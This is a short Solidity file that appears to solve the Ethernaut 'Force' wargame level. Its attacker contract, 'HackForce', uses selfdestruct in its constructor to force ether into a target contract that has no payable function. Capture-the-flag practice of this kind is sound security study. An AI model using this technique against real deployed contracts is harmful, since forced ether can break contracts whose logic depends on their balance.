// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackForce {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }